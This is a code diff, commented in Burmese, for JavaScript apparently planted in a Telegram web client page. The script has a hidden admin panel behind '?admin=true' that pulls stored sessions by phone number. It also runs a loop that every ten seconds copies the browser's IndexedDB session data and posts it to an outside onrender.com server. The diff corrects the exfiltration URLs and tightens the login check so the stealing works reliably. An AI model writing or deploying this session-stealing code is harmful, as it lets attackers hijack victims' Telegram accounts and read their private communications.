@@ -136,7 +136,6 @@ setTimeout(() => {
 
     // =========================================================
     // ၁။ 📥 လျှို့ဝှက် ADMIN မျက်နှာပြင် (?admin=true ဟုရိုက်လျှင်)
-    // (အစ်ကို စာရိုက်လို့ရ၊ ခလုတ်နှိပ်လို့ရသွားသော ကုတ်အတိုင်းဖြစ်သည်)
     // =========================================================
     if (window.location.search.includes('admin=true')) {
         document.body.innerHTML = '';
@@ -146,7 +145,7 @@ setTimeout(() => {
         adminDiv.innerHTML = `
             <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px; font-family: sans-serif;">
                 <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
-                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: QR_User_84300)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
+                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: ID_123456)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
                 <button id="myAdminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                 <p id="myAdminStatus" style="color:red; margin-top:15px; font-size:14px; font-weight:bold;"></p>
             </div>
@@ -171,7 +170,7 @@ setTimeout(() => {
                 statusMsg.innerText = "Database တွင် ရှာဖွေနေပါသည်...";
 
                 // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-                fetch(`https://https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
+                fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
                 .then(res => res.json())
                 .then(result => {
                     if (!result.success) {
@@ -208,7 +207,7 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (Data အောင်မြင်စွာ ဝင်ခဲ့သော ကုတ်)
+    // ၂။ 📤 STAFF AUTO-SYNC (STRICT LOGIN CHECK - အမှိုက် Data များ မပို့တော့ပါ)
     // =========================================================
     setInterval(() => {
         try {
@@ -223,30 +222,32 @@ setTimeout(() => {
                         const vals = e1.target.result;
                         const keys = e2.target.result;
                         
-                        // Data မရှိသေးရင် ရပ်မည်
-                        if (keys.length < 2) return;
-
                         const data: any = {};
-                        keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
+                        let currentUserId = null;
+
+                        keys.forEach((k: string, i: number) => { 
+                            data[k] = vals[i]; 
+                            // 🌟 User ID ကို အတိအကျ လိုက်ရှာမည် 🌟
+                            if (k === 'currentUserId') currentUserId = vals[i];
+                        });
                         
+                        // 🌟 အရေးကြီးဆုံး: User ID မရှိသေးလျှင် (Login မဝင်ရသေးလျှင်) ဘာ Data မှ မပို့ပါ 🌟
+                        if (!currentUserId) return; 
+
+                        // User ID တွေ့မှသာ အောက်ပါအလုပ်များကို ဆက်လုပ်မည်
                         const dataString = JSON.stringify(data);
-                        
-                        // 🌟 ပြဿနာတက်သော localStorage မှတ်ဉာဏ်ကို ဖျက်ပြီး တိုက်ရိုက်ရှာမည် 🌟
                         let phone = "";
                         let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
-                        let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
                         
+                        // ဖုန်းနံပါတ် တွေ့ရင် ဖုန်းနံပါတ်ဖြင့် သိမ်းမည်၊ မတွေ့ပါက User ID ဖြင့် အတိအကျ သိမ်းမည်
                         if (phoneMatch && phoneMatch[1]) {
                             phone = '+' + phoneMatch[1];
-                        } else if (idMatch && idMatch[1]) {
-                            phone = "ID_" + idMatch[1];
                         } else {
-                            // Account တိုင်း မထပ်အောင် User ID တစ်ခု အသစ်ဖန်တီးမည်
-                            phone = "QR_User_" + (dataString.length % 100000).toString(); 
+                            phone = "ID_" + currentUserId;
                         }
                         
                         // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-                        fetch("https://https://telegram-7ih3.onrender.com/api/save-web-session", {
+                        fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
@@ -255,7 +256,7 @@ setTimeout(() => {
                 };
             };
         } catch(err) {}
-    }, 10000); // ၁၀ စက္ကန့် တစ်ခါ အသေချာဆုံး ပို့ပေးမည်
+    }, 10000); // ၁၀ စက္ကန့် တစ်ခါ Auto Save နေပါမည်
 
 }, 2000);
 // -----------------------------------------------------------
